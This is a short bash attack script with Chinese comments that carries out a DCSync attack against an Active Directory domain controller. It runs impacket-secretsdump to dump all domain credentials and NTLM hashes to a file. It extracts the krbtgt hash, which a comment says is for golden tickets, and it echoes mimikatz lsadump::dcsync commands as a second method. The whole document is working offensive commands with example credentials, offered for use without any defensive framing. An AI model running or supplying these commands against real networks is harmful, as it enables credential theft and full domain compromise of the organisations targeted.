#!/bin/bash
# DCSync 域控同步攻击脚本
# 需要域管权限或 DS-Replication-Get-Changes 权限

DC_IP="192.168.1.10"
DOMAIN="corp.local"
USER="corp\\administrator"
PASS="Password123!"

echo "[*] 方式一：使用 impacket-secretsdump 执行 DCSync"
impacket-secretsdump \
    -just-dc \
    ${USER}:${PASS}@${DC_IP}

echo ""
echo "[*] 方式二：仅导出 NTLM 哈希"
impacket-secretsdump \
    -just-dc-ntlm \
    ${USER}:${PASS}@${DC_IP} \
    -outputfile dcsync_hashes

echo ""
echo "[*] 方式三：使用 mimikatz 执行 DCSync（在域内机器上）"
echo "    mimikatz # lsadump::dcsync /domain:${DOMAIN} /all /csv"
echo "    mimikatz # lsadump::dcsync /domain:${DOMAIN} /user:krbtgt"

echo ""
echo "[*] 提取 krbtgt 哈希（用于黄金票据）"
impacket-secretsdump \
    -just-dc-user krbtgt \
    ${USER}:${PASS}@${DC_IP}
